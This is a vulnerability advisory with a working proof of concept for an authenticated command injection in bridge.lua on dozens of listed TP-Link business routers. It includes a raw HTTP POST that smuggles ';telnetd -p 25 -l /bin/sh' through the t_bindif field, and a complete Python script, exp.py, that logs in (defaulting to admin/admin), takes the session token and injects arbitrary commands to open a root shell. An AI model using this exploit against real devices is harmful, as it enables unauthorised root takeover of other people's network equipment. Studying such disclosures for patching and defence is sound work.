	[Vulnerability]:
Command Injection in bridge.lua 

------------------------------------------
[Exploitation]:
Can remote command execution on the root shell.

------------------------------------------
[Vendor of Product]:
Tp-Link router

------------------------------------------
[Affected Products and firmware version]:
Tp-Link TL-WVR300		(Only hardware version v4)
Tp-Link TL-WVR302		(only hardware version v2)
Tp-Link TL-WVR450		(ALL the hardware version and firmware version)
Tp-Link TL-WVR450L		(ALL the hardware version and firmware version)
Tp-Link TL-WVR450G		(Only hardware version v5)
Tp-Link TL-WVR458		(ALL the hardware version and firmware version)
Tp-Link TL-WVR458L		(ALL the hardware version and firmware version)
Tp-Link TL-WVR458P		(ALL the hardware version and firmware version)
Tp-Link TL-WVR900G		(Only hardware version v3)
Tp-Link TL-WVR900L		(ALL the hardware version and firmware version)
Tp-Link TL-WVR1200L		(ALL the hardware version and firmware version)
Tp-Link TL-WVR1300L		(ALL the hardware version and firmware version)
Tp-Link TL-WVR1300G		(ALL the hardware version and firmware version)
Tp-Link TL-WVR1750L		(ALL the hardware version and firmware version)
Tp-Link TL-WVR2600L		(ALL the hardware version and firmware version)
Tp-Link TL-WVR4300L		(ALL the hardware version and firmware version)
Tp-Link TL-WAR302		(ALL the hardware version and firmware version)
Tp-Link TL-WAR450		(ALL the hardware version and firmware version)
Tp-Link TL-WAR450L		(ALL the hardware version and firmware version)
Tp-Link TL-WAR458		(ALL the hardware version and firmware version)
Tp-Link TL-WAR458L		(ALL the hardware version and firmware version)
Tp-Link TL-WAR900L		(ALL the hardware version and firmware version)
Tp-Link TL-WAR1200L		(ALL the hardware version and firmware version)
Tp-Link TL-WAR1300L		(ALL the hardware version and firmware version)
Tp-Link TL-WAR1750L		(ALL the hardware version and firmware version)
Tp-Link TL-WAR2600L		(ALL the hardware version and firmware version)
Tp-Link TL-ER3210G		(ALL the hardware version and firmware version)
Tp-Link TL-ER3220G		(ALL the hardware version and firmware version)
Tp-Link TL-ER5110G		(ALL the hardware version and firmware version)
Tp-Link TL-ER5120G		(ALL the hardware version and firmware version)
Tp-Link TL-ER5510G		(Only hardware version v2,v3)
Tp-Link TL-ER5520G		(Only hardware version v2,v3)
Tp-Link TL-ER6110G		(ALL the hardware version and firmware version)
Tp-Link TL-ER6120G		(Only hardware version v2)
Tp-Link TL-ER6220G		(ALL the hardware version and firmware version)
Tp-Link TL-ER6510G		(ALL the hardware version and firmware version)
Tp-Link TL-ER6520G		(Only hardware version v2,v3)
Tp-Link TL-ER7520G		(ALL the hardware version and firmware version)
Tp-Link TL-R473			(only hardware version v5)
Tp-Link TL-R473G		(ALL the hardware version and firmware version)
Tp-Link TL-R473P-AC		(ALL the hardware version and firmware version)
Tp-Link TL-R473GP-AC		(ALL the hardware version and firmware version)
Tp-Link TL-R478			(only hardware version v6)
Tp-Link TL-R478+		(only hardware version v7)
Tp-Link TL-R478G		(ALL the hardware version and firmware version)
Tp-Link TL-R478G+		(only hardware version v3)
Tp-Link TL-R479P-AC 		(ALL the hardware version and firmware version)
Tp-Link TL-R479GP-AC		(ALL the hardware version and firmware version)
Tp-Link TL-R479GPE-AC		(ALL the hardware version and firmware version)
Tp-Link TL-R483			(only hardware version v5)
Tp-Link TL-R483G		(only hardware version v2)
Tp-Link TL-R488			(Only hardware version v5)
Tp-Link TL-R4149G		(ALL the hardware version and firmware version)
Tp-Link TL-R4239G		(Only hardware version v2)
Tp-Link TL-R4299G		(Only hardware version v2)

------------------------------------------
[Attack Type]:
Remote

------------------------------------------
[Reference]:
http://service.tp-link.com.cn/download/201612/TL-WVR450L%20V1.0%E5%8D%87%E7%BA%A7%E8%BD%AF%E4%BB%B620161125.zip  (Official firmware for TL-WVR450L)
http://www.tp-link.com.cn/product_listsmb_2008_26_00_01_02_03_04.html
http://www.tp-link.com.cn/product_listsmb_2022_9_00_01_02_03.html
http://www.tp-link.com.cn/product_listsmb_2023_7_00_01_02.html

------------------------------------------
[Discoverer]:
Tianfeng Guan, Sichuan Silent Information Technology Co.,Ltd ,http://www.silence.com.cn/

------------------------------------------
[Affected components]:
Affected executable application: uhttpd
Affected source code file: /usr/lib/lua/luci/controller/admin/bridge.lua
Affected function: get_device_byif(iface)

------------------------------------------
[Vulnerability details]:
After the web login Authentication, When accessing the bridge.lua through the web manager(uhttpd), 
we can add a bridge interface by the controller function add_br(http_form).
During this operation, it doesn't limit and check the value of the parameter "t_bindif" in http post data.
And in the bridge.lua, it defines the local function get_device_byif(iface) to handle input http post data "t_bindif".

step1.	http post to bridge.lua and make method=add
step2.		--> function add_br(http_form) 
step3.			--> local function check_section_available(data, op) 
step4.				--> local function tophy(ifname) 
step5.					--> local function get_device_byif(iface)

local function get_device_byif(iface)
	local mycmd = ". /lib/zone/zone_api.sh; zone_get_device_byif " .. iface

	ff = io.popen(mycmd, "r")
	if not ff then
		return false
	end

	local ll = ff:read("*l")
	if not ll then
		return false
	end

	local ret = string.gsub(tostring(ll), "%s.*", "")
	return ret
end 

So, we can see the local function get_device_byif doesn't have any check and limit to the input parameter,
and it will use the io.popen to execute the shell command which include the value of the parameter "t_bindif" in http post data.

------------------------------------------
[Exploitation details]:
Because access to the bridge.lua requires web authentication,so it needs the web login credentials, or a session hijack vulnerability,
or a weak credentials brute force attack to get access permissions for the bridge.lua at first. 
And then, we can use this Authenticated Remote Command Execution vulnerability to execute any command on the root shell.
For example, we can send a http post request like:

POST /cgi-bin/luci/;stok=5e2bd3d2d19d61207bcdfc7e85f6010c/admin/bridge?form=bridge_setting HTTP/1.1
Host: 192.168.3.1
Content-Length: 217
Accept: application/json, text/javascript, */*; q=0.01
Origin: http://192.168.3.1
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.116 Safari/537.36
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Referer: http://192.168.3.1/webpages/index.html
Accept-Encoding: gzip, deflate
Cookie: sysauth=b1f57e85f01660b0fafbf9f057af23df
Connection: close

data=%7B%22method%22%3A%22add%22%2C%22params%22%3A%7B%22new%22%3A%7B%22t_name%22%3A%22exploit%22%2C%22t_useconfig%22%3A%220%22%2C%22t_configif%22%3A%221%22%2C%22t_bindif%22%3A%22%3Btelnetd+-p+25+-l+/bin/sh%22%7D%7D%7D

Finally, this http post request packet will make the router execute the command "telnetd -p 25 -l /bin/sh".

------------------------------------------
[exp.py]:
# Tested product: TL-WVR450L
# Hardware versionï¼šV1.0
# Firmware version: 20161125
# The RSA_Encryption_For_Tplink.js is use for Rsa Encryption to the password when login the web manager.
# You can download the RSA_Encryption_For_Tplink.js by https://github.com/coincoin7/Wireless-Router-Vulnerability/blob/master/RSA_Encryption_For_Tplink.js

import execjs
import requests
import json
import urllib


def read_js():
    file = open("./RSA_Encryption_For_Tplink.js", 'r')
    line = file.readline()
    js = ''
    while line:
        js = js + line
        line = file.readline()
    file.close()
    return js


def execute(ip, port, username, passwd, cmd):

    try:
        s = requests.session()


        uri = "http://{}:{}".format(ip,port)
        headers = {
            'Content-Type':'application/x-www-form-urlencoded; charset=UTF-8',
            'Referer': 'http://{}/webpages/login.html'.format(ip)
            }
        payload = {
            "method":"get"
        }
        ret = s.post(uri + '/cgi-bin/luci/;stok=/login?form=login', data=urllib.urlencode({"data":json.dumps(payload)}), headers=headers, timeout=5)
        rsa_public_n = json.loads(ret.text)['result']['password'][0].encode("utf-8")
        rsa_public_e = json.loads(ret.text)['result']['password'][1].encode("utf-8")
        js = read_js()
        js_handle = execjs.compile(js)
        password = js_handle.call('MainEncrypt', rsa_public_n, rsa_public_e, passwd)


        payload = {
            "method":"login",
            "params":{
                "username":"{}".format(username),
                "password":"{}".format(password)
            }
        }
        ret = s.post(uri + '/cgi-bin/luci/;stok=/login?form=login', data=urllib.urlencode({"data":json.dumps(payload)}), headers=headers, timeout=5)
        stok = json.loads(ret.text)['result']['stok'].encode('utf-8')
        cookie = ret.headers['Set-Cookie']


        print '[+] Login success'
        print '[+] Get The Token: ' + stok
        print '[+] Get The Cookie: ' + cookie


        headers = {
            'Content-Type':'application/x-www-form-urlencoded; charset=UTF-8',
            'Referer':'http://{}/webpages/login.html'.format(ip),
            'Cookie':'{}'.format(cookie)
            }
        payload = {
            "method":"add",
            "params":{
                "new":{
                    "t_name":"exploit",
                    "t_useconfig":"0",
                    "t_configif":"1",
                    "t_bindif":";{}".format(cmd)
                }
            }
        }
        ret = s.post(uri + '/cgi-bin/luci/;stok={}/admin/bridge?form=bridge_setting'.format(stok), data=urllib.urlencode({"data":json.dumps(payload)}), headers=headers, timeout=5)


        #print ret.text
        print '[+] Finish RCE'
        print '--------------------------------------------------------------'
        return True

    except:
        return False


if __name__=='__main__':
    print '-----------Tplink LUCI Bridge Authenticated RCE-----------'
    print execute('192.168.1.1', 80, 'admin', 'admin', 'telnetd -p 25 -l /bin/sh')
